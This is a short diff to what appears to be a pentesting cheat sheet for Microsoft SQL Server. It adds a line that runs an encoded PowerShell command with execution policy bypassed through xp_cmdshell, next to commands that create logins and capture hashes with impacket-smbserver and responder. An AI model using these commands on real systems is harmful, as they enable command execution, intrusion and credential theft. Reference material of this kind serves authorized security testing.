@@ -152,6 +152,12 @@ create login [<domain_netbios>\<user>] from windows;
 ```sql
 EXEC master..xp_cmdshell '<cmd|whoami /all>'
 ```
+
+## execute command (powershell encoded)
+```sql
+DECLARE @CMD VARCHAR(8000); SET @CMD = 'powershell -exec bypass -enc <base64encoded>'; EXEC master..xp_cmdshell @CMD
+```
+
 ## Hash gathering - 
 sudo impacket-smbserver share ./ -smb2support
 sudo responder -I tun0
